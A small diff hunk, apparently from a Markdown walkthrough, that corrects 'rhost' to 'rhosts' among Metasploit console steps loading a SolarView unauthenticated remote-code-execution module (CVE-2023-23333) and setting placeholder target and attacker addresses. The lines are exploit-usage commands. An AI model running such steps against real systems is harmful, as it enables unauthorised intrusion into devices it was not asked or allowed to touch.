@@ -37,7 +37,7 @@ msfdb reinit; msfconsole -q
 use exploit/linux/http/solarview_unauth_rce_cve_2023_23333.rb
 ```
 ```
-set rhost target_ip
+set rhosts target_ip
 ```
 ```
 set lhost attacker_ip
